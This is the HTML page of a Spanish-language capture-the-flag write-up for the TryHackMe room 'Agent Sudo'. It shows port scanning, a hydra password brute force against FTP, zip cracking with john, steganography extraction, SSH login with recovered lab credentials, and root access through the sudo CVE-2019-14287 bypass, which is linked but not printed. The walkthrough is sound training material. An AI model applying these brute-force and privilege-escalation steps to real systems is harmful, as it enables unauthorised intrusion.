@@ -1,0 +1,668 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>TryHackMe - Agent Sudo :: sckull — HackTheBox Writeups, CTF</title>    
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="description" content="Titulo Agent Sudo     Room Agent Sudo   Info You found a secret server located under the deep sea. Your task is to hack inside the server and reveal the truth.   Puntos 3311   Dificultad Facil   Maker Deskel    NMAP Escaneo de puertos tcp/udp, nmap nos muestra el puerto http (80), el puerto ssh (22) y el puerto ftp (21) abiertos."/>
+<meta name="keywords" content=""/>
+<meta name="robots" content="noodp"/>
+<link rel="canonical" href="/posts/agent_sudo/" />
+
+
+<link rel="stylesheet" href="/assets/style.css">
+
+
+<link rel="stylesheet" href="/style.css">
+
+
+<link rel="shortcut icon" href="/img/favicon.png">
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+<script src="https://kit.fontawesome.com/57784fec54.js" crossorigin="anonymous"></script>
+
+
+<meta name="twitter:card" content="summary" />
+<meta name="twitter:title" content="TryHackMe - Agent Sudo :: sckull — HackTheBox Writeups, CTF" />
+<meta name="twitter:description" content="Titulo Agent Sudo     Room Agent Sudo   Info You found a secret server located under the deep sea. Your task is to hack inside the server and reveal the truth.   Puntos 3311   Dificultad Facil   Maker Deskel    NMAP Escaneo de puertos tcp/udp, nmap nos muestra el puerto http (80), el puerto ssh (22) y el puerto ftp (21) abiertos." />
+<meta name="twitter:site" content="/" />
+<meta name="twitter:creator" content="sckull" />
+<meta name="twitter:image" content="/image/tryhackme/agentsudo/cover.png">
+
+
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="TryHackMe - Agent Sudo :: sckull — HackTheBox Writeups, CTF">
+<meta property="og:description" content="Titulo Agent Sudo     Room Agent Sudo   Info You found a secret server located under the deep sea. Your task is to hack inside the server and reveal the truth.   Puntos 3311   Dificultad Facil   Maker Deskel    NMAP Escaneo de puertos tcp/udp, nmap nos muestra el puerto http (80), el puerto ssh (22) y el puerto ftp (21) abiertos." />
+<meta property="og:url" content="/posts/agent_sudo/" />
+<meta property="og:site_name" content="TryHackMe - Agent Sudo" />
+<meta property="og:image" content="/image/tryhackme/agentsudo/cover.png">
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+<meta name="google-site-verification" content="cug_0s4kFi5UbEfBI5hJsscmJ7XdimqECCYfN1EAZq0" />
+
+
+<script type="application/ld+json">
+    {
+        "@context" : "http://schema.org",
+        "@type" : "BlogPosting",
+        "mainEntityOfPage": {
+             "@type": "WebPage",
+             "@id": "/"
+        },
+        "articleSection" : "posts",
+        "name" : "TryHackMe - Agent Sudo",
+        "headline" : "TryHackMe - Agent Sudo",
+        "description" : "Titulo Agent Sudo     Room Agent Sudo   Info You found a secret server located under the deep sea. Your task is to hack inside the server and reveal the truth.   Puntos 3311   Dificultad Facil   Maker Deskel    NMAP Escaneo de puertos tcp/udp, nmap nos muestra el puerto http (80), el puerto ssh (22) y el puerto ftp (21) abiertos.",
+        "inLanguage" : "en-US",
+        "author" : "",
+        "creator" : "",
+        "publisher": "",
+        "accountablePerson" : "",
+        "copyrightHolder" : "",
+        "copyrightYear" : "2020",
+        "datePublished": "2020-02-04 00:00:00 &#43;0000 UTC",
+        "dateModified" : "2020-02-04 00:00:00 &#43;0000 UTC",
+        "url" : "/posts/agent_sudo/",
+        "wordCount" : "1245",
+        "keywords" : [ "tryhackme","CVE-2019-14287","Blog" ]
+    }
+    </script>
+
+
+<meta property="article:published_time" content="2020-02-04 00:00:00 &#43;0000 UTC" />
+
+
+
+
+<a name="top"></a>
+</head>
+
+<body class="dark-theme">
+  
+<div class="container">
+  <header class="header">
+  <span class="header__inner">
+    <a href="/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" width="44" height="44" viewBox="0 0 44 44">
+  <polyline fill="none" stroke="#fff" stroke-width="2" points="15 8 29.729 22.382 15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">sckull | blog</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+    
+      
+        
+                   
+
+          
+
+          
+
+          
+            <li><a href="/about">About</a></li>
+          
+
+        
+      
+        
+                   
+
+          
+            <li><a href="/tags/hackthebox/"><img class="icon" src="/hackthebox.ico" width="32" title="HackTheBox"></a></li>
+          
+
+          
+
+          
+
+        
+      
+        
+                   
+
+          
+
+          
+            <li><a href="/tags/tryhackme/"><img class="icon" src="/thm.ico" width="32" title="TryHackMe"></a></li>
+          
+
+          
+
+        
+      
+      
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        
+
+          
+
+          
+
+          
+            <li><a href="/about">About</a></li>
+          
+
+      
+    
+      
+        
+
+          
+            <li><a href="/tags/hackthebox/"><img class="icon" src="/hackthebox.ico" width="32" title="HackTheBox"></a></li>
+          
+
+          
+
+          
+
+      
+    
+      
+        
+
+          
+
+          
+            <li><a href="/tags/tryhackme/"><img class="icon" src="/thm.ico" width="32" title="TryHackMe"></a></li>
+          
+
+          
+
+      
+    
+  </ul>
+</nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none"/>
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+          </svg>
+        </span>
+      
+      
+    </span>
+  </span>
+  <link rel="shortcut icon" href="https://sckullbock.blogspot.com/favicon.ico">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/2.5.0/Chart.min.js"></script>
+</header>
+
+  
+  <div class="content">    
+    
+
+  <div class="post">
+    <h2 class="post-title">TryHackMe - Agent Sudo</h2>
+    <div class="post-meta">
+      
+        <span class="post-date">
+          <i class="fas fa-calendar-week"></i>
+            Tuesday, Feb 4, 2020
+        </span>
+      
+      <span class="post-author">— Written by sckull</span>
+      
+        <span class="post-read-time">— 6 min read</span>
+      
+    </div>
+        
+    
+      <span class="post-tags">
+        
+         <a class="button-tag" href="/tags/tryhackme/"><li class="fa fa-tag"></li> tryhackme</a>&nbsp;
+        
+         <a class="button-tag" href="/tags/cve-2019-14287/"><li class="fa fa-tag"></li> CVE-2019-14287</a>&nbsp;
+        
+      </span>
+    
+
+    
+      
+        <img src="/posts/agent_sudo/../../image/tryhackme/agentsudo/cover.png" class="post-cover center" />
+      
+      <hr />
+     
+    
+
+    <div class="contenido">
+      <h2>Contenido</h2>
+      <nav id="TableOfContents">
+<ul>
+<li>
+<ul>
+<li><a href="#nmap">NMAP</a></li>
+<li><a href="#http">HTTP</a>
+<ul>
+<li><a href="#whatweb">WHATWEB</a></li>
+<li><a href="#gobuster">GOBUSTER</a></li>
+<li><a href="#http-web">HTTP Web</a></li>
+</ul></li>
+<li><a href="#ftp">FTP</a></li>
+<li><a href="#stego">STEGO</a></li>
+<li><a href="#ssh-user">SSH - User</a></li>
+<li><a href="#privilege-escalation">PRIVILEGE ESCALATION</a></li>
+</ul></li>
+</ul>
+</nav>
+    </div>
+
+    <div class="post-content">      
+      
+
+<table>
+<thead>
+<tr>
+<th>Titulo</th>
+<th>Agent Sudo</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>Room</td>
+<td>Agent Sudo</td>
+</tr>
+
+<tr>
+<td>Info</td>
+<td>You found a secret server located under the deep sea. Your task is to hack inside the server and reveal the truth.</td>
+</tr>
+
+<tr>
+<td>Puntos</td>
+<td>3311</td>
+</tr>
+
+<tr>
+<td>Dificultad</td>
+<td>Facil</td>
+</tr>
+
+<tr>
+<td>Maker</td>
+<td><a href="https://tryhackme.com/p/DesKel">Deskel</a></td>
+</tr>
+</tbody>
+</table>
+
+<h2 id="nmap">NMAP</h2>
+
+<p>Escaneo de puertos tcp/udp, nmap nos muestra el puerto http (80), el puerto ssh (22) y el puerto ftp (21) abiertos.</p>
+
+<pre><code class="language-bash"># Nmap 7.80 scan initiated Tue Feb  4 21:35:26 2020 as: nmap -p- -sV -sC -T4 -o nmap_scan 10.10.235.45
+Nmap scan report for 10.10.235.45
+Host is up (0.20s latency).
+Not shown: 65532 closed ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
+|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
+|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Annoucement
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Tue Feb  4 21:43:52 2020 -- 1 IP address (1 host up) scanned in 506.11 seconds
+</code></pre>
+
+<h2 id="http">HTTP</h2>
+
+<h3 id="whatweb">WHATWEB</h3>
+
+<p>Esca corriendo una pagina sobre apache 2.4.29.</p>
+
+<pre><code class="language-bash">root@aoiri:~/tryhackme/agentsudo# whatweb http://10.10.235.45
+http://10.10.235.45 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.235.45], Title[Annoucement]
+root@aoiri:~/tryhackme/agentsudo#
+</code></pre>
+
+<h3 id="gobuster">GOBUSTER</h3>
+
+<p>Utilizamos gobuster para busqueda de directorios y archivos que nos pudiesen servir.</p>
+
+<pre><code class="language-bash">root@aoiri:~/tryhackme/agentsudo# gobuster dir -u 10.10.235.45 -w /usr/share/wordlists/dirb/common_nofirst10.txt -x php,html,txt -t 15 -q
+/index.php (Status: 200)
+/index.php (Status: 200)
+/server-status (Status: 403)
+</code></pre>
+
+<h3 id="http-web">HTTP Web</h3>
+
+<p>Al visitar la pagina encontramos un mensaje, en el cual nos mencionan el user-agent y que debemos de utilizar nuestro nombre en codigo para acceder.
+<img src="../../image/tryhackme/agentsudo/Screenshot_20200204_215904.png" alt="image" /></p>
+
+<p>Utilizamos &lsquo;R&rsquo; en User-Agent y nos muestra un mensaje distinto.
+<img src="../../image/tryhackme/agentsudo/Screenshot_20200204_220129.png" alt="image" /></p>
+
+<p>Utilizamos BURPSUITE para poder realizar distintas peticiones con el &lsquo;User-Agent&rsquo; utilizando como payloads:</p>
+
+<pre><code class="language-python">&gt;&gt;&gt; import string
+&gt;&gt;&gt; print string.printable
+0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!&quot;#$%&amp;'()*+,-./:;&lt;=&gt;?@[\]^_`{|}~
+</code></pre>
+
+<p>Encontramos que existe el <code>Agente C</code>, el contenido solo puede ser visto en nuestro navegador ya que nos redirige hacia otra pagina.</p>
+
+<p><img src="../../image/tryhackme/agentsudo/Screenshot_20200204_220900.png" alt="image" /></p>
+
+<p>Agente C:
+Nos muestra un mensaje que muestra el nombre del agente &lsquo;chris&rsquo;.
+<img src="../../image/tryhackme/agentsudo/Screenshot_20200204_220951.png" alt="image" /></p>
+
+<h2 id="ftp">FTP</h2>
+
+<p>Para poder acceder al servicio de FTP utilizamos hydra para realizar fuerza bruta a la contraseña con el usuario chris.</p>
+
+<pre><code class="language-bash">root@aoiri:~/tryhackme/agentsudo# hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.235.45
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-02-04 22:13:47
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking ftp://10.10.235.45:21/
+[STATUS] 240.00 tries/min, 240 tries in 00:01h, 14344159 to do in 996:08h, 16 active
+[21][ftp] host: 10.10.235.45   login: chris   password: crystal
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-02-04 22:14:56
+</code></pre>
+
+<p>Al acceder nos encontramos con varios archivos:</p>
+
+<pre><code class="language-bash">root@aoiri:~/tryhackme/agentsudo# ftp 10.10.235.45
+Connected to 10.10.235.45.
+220 (vsFTPd 3.0.3)
+Name (10.10.235.45:root): chris
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rw-r--r--    1 0        0             217 Oct 29 12:15 To_agentJ.txt
+-rw-r--r--    1 0        0           33143 Oct 29 12:22 cute-alien.jpg
+-rw-r--r--    1 0        0           34842 Oct 29 12:33 cutie.png
+226 Directory send OK.
+ftp&gt; mget *
+mget To_agentJ.txt? y
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for To_agentJ.txt (217 bytes).
+226 Transfer complete.
+217 bytes received in 0.00 secs (1.3526 MB/s)
+mget cute-alien.jpg? y
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for cute-alien.jpg (33143 bytes).
+226 Transfer complete.
+33143 bytes received in 0.22 secs (145.3596 kB/s)
+mget cutie.png? y
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for cutie.png (34842 bytes).
+226 Transfer complete.
+34842 bytes received in 0.35 secs (95.8564 kB/s)
+ftp&gt;
+</code></pre>
+
+<p>En el archivo de texto nos muestra un mensaje para el Agente J, en el que explica que la contraseña esta dentro de la imagen falsa.</p>
+
+<pre><code class="language-bash">root@aoiri:~/tryhackme/agentsudo# cat To_agentJ.txt 
+Dear agent J,
+
+All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.
+
+From,
+Agent C
+</code></pre>
+
+<p><img src="../../image/tryhackme/agentsudo/Screenshot_20200204_222550.png" alt="image" /></p>
+
+<h2 id="stego">STEGO</h2>
+
+<p>Utilizamos binwalk para ver el contenido de las imagenes y vemos que la imagen PNG tiene un archivo de texto.</p>
+
+<pre><code class="language-bash">root@aoiri:~/tryhackme/agentsudo/tmp# binwalk cute-alien.jpg 
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             JPEG image data, JFIF standard 1.01
+
+root@aoiri:~/tryhackme/agentsudo/tmp# binwalk cutie.png 
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
+869           0x365           Zlib compressed data, best compression
+34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
+34820         0x8804          End of Zip archive, footer length: 22
+
+root@aoiri:~/tryhackme/agentsudo/tmp#
+</code></pre>
+
+<p>Extraemos el contenido de la imagen con binwalk y encontramos un archivo comprimido que contiene el archivo de texto, utilizamos john the ripper para obtener la contraseña por fuerza bruta.</p>
+
+<pre><code class="language-bash">root@aoiri:~/tryhackme/agentsudo/tmp/_cutie.png.extracted# zip2john 8702.zip &gt; hash_zip
+ver 81.9 8702.zip/To_agentR.txt is not encrypted, or stored with non-handled compression type
+root@aoiri:~/tryhackme/agentsudo/tmp/_cutie.png.extracted# cat hash_zip 
+8702.zip/To_agentR.txt:$zip2$*0*1*0*4673cae714579045*67aa*4e*61c4cf3af94e649f827e5964ce575c5f7a239c48fb992c8ea8cbffe51d03755e0ca861a5a3dcbabfa618784b85075f0ef476c6da8261805bd0a4309db38835ad32613e3dc5d7e87c0f91c0b5e64e*4969f382486cb6767ae6*$/zip2$:To_agentR.txt:8702.zip:8702.zip
+root@aoiri:~/tryhackme/agentsudo/tmp/_cutie.png.extracted# john hash_zip 
+Using default input encoding: UTF-8
+Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
+Will run 2 OpenMP threads
+Proceeding with single, rules:Single
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Almost done: Processing the remaining buffered candidate passwords, if any.
+Warning: Only 10 candidates buffered for the current salt, minimum 16 needed for performance.
+Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
+alien            (8702.zip/To_agentR.txt)
+1g 0:00:00:00 DONE 2/3 (2020-02-04 22:58) 1.052g/s 46303p/s 46303c/s 46303C/s 123456..Peter
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed
+root@aoiri:~/tryhackme/agentsudo/tmp/_cutie.png.extracted#
+</code></pre>
+
+<p>Extraemos los archivos del archivo zip:</p>
+
+<pre><code class="language-bash">root@aoiri:~/tryhackme/agentsudo/tmp/_cutie.png.extracted# 7z x 8702.zip 
+
+7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
+p7zip Version 16.02 (locale=en_US.utf8,Utf16=on,HugeFiles=on,64 bits,2 CPUs Intel(R) Core(TM) i5-8250U CPU @ 1.60GHz (806EA),ASM,AES-NI)
+
+Scanning the drive for archives:
+1 file, 280 bytes (1 KiB)
+
+Extracting archive: 8702.zip
+--
+Path = 8702.zip
+Type = zip
+Physical Size = 280
+
+    
+Enter password (will not be echoed): alien
+Everything is Ok    
+
+Size:       86
+Compressed: 280
+root@aoiri:~/tryhackme/agentsudo/tmp/_cutie.png.extracted# ls
+365  365.zlib  8702.zip  hash_zip  To_agentR.txt
+</code></pre>
+
+<p>Vemos un mensaje que nos muestra la contraseña de la que nos mencionaba la anterior nota:</p>
+
+<pre><code class="language-bash">root@aoiri:~/tryhackme/agentsudo/tmp/_cutie.png.extracted# cat To_agentR.txt 
+Agent C,
+
+We need to send the picture to 'QXJlYTUx' as soon as possible!
+
+By,
+Agent R
+root@aoiri:~/tryhackme/agentsudo/tmp/_cutie.png.extracted#
+</code></pre>
+
+<p>Utilizamos la contraseña (decodificada en base64) para obtener los archivos de la imagen JPG:</p>
+
+<pre><code class="language-bash">root@aoiri:~/tryhackme/agentsudo/tmp# steghide extract -sf cute-alien.jpg 
+Enter passphrase: Area51
+wrote extracted data to &quot;message.txt&quot;.
+root@aoiri:~/tryhackme/agentsudo/tmp# cat message.txt 
+Hi james,
+
+Glad you find this message. Your login password is hackerrules!
+
+Don't ask me why the password look cheesy, ask agent R who set this password for you.
+
+Your buddy,
+chris
+root@aoiri:~/tryhackme/agentsudo/tmp#
+</code></pre>
+
+<h2 id="ssh-user">SSH - User</h2>
+
+<p>Ahora que tenemos las credenciales, las utilizamos con el servicio SSH de la maquina, obtenemos nuestra shell y nuestra flag <strong>user.txt</strong>.</p>
+
+<p>Credenciales:</p>
+
+<pre><code>james:hackerrules!
+</code></pre>
+
+<p><img src="../../image/tryhackme/agentsudo/Screenshot_20200204_231631.png" alt="image" /></p>
+
+<h2 id="privilege-escalation">PRIVILEGE ESCALATION</h2>
+
+<p>Hacemos una enumeracion sencilla con sudo -l para listar los comandos/archivos que podemos ejecutar sin contraseña y con privilegios root, vemos /bin/bash pero al intentar ejecutarlo con sudo no se ejecuta.</p>
+
+<pre><code class="language-bash">james@agent-sudo:~$ sudo -l -l
+[sudo] password for james: 
+Matching Defaults entries for james on agent-sudo:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User james may run the following commands on agent-sudo:
+
+Sudoers entry:
+    RunAsUsers: ALL, !root
+    Commands:
+	/bin/bash
+james@agent-sudo:~$ sudo /bin/bash
+Sorry, user james is not allowed to execute '/bin/bash' as root on agent-sudo.
+james@agent-sudo:~$ 
+</code></pre>
+
+<p>Buscamos una vulnerabilidad para sudo y vemos que existe un exploit con el cual podemos obtener acceso de superusuario.</p>
+
+<p><a href="https://www.exploit-db.com/exploits/47502"><strong>sudo 1.8.27 - Security Bypass</strong></a></p>
+
+<p>Descargamos el exploit, lo ejecutamos, obtenemos nuestra shell y nuestra flag <strong>root.txt</strong>.</p>
+
+<p><img src="../../image/tryhackme/agentsudo/Screenshot_20200204_232719.png" alt="image" /></p>
+
+    </div>    
+    <hr />
+    
+    <div>
+      
+        
+<div id="disqus_thread"></div>
+<script>
+(function() {
+var d = document, s = d.createElement('script');
+s.src = 'https://sckull.disqus.com/embed.js';
+s.setAttribute('data-timestamp', +new Date());
+(d.head || d.body).appendChild(s);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+      
+      
+    </div>
+
+    
+      <div class="pagination">
+        <div class="pagination__title">
+          <span class="pagination__title-h">Read other posts</span>
+          <hr />
+        </div>
+        <div class="pagination__buttons">
+          
+          
+            <span class="button next">
+              <a href="/posts/bitlab/">
+                <span class="button__text">Hack The Box - Bitlab</span>
+                <span class="button__icon">→</span>
+              </a>
+            </span>
+          
+        </div>
+      </div>
+      
+    
+    
+    
+  </div>
+  
+    
+  </div>
+  
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <a href="/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" width="44" height="44" viewBox="0 0 44 44">
+  <polyline fill="none" stroke="#fff" stroke-width="2" points="15 8 29.729 22.382 15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">sckull | blog</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+      <div class="copyright">
+        <span style="font-size: 0.85em;">© 2020 sckull</span>
+        
+      
+      </div>
+    
+  </div>
+</footer>
+
+<script src="/assets/main.js"></script>
+<script src="/assets/prism.js"></script>
+
+  
+  
+  
+  <a class="float" id="myBtn" href="#top"><i class="fa fa-arrow-up" aria-hidden="true"></i></a>
+  
+</div>
+
+
+
+
+
+
+</body>
+</html>
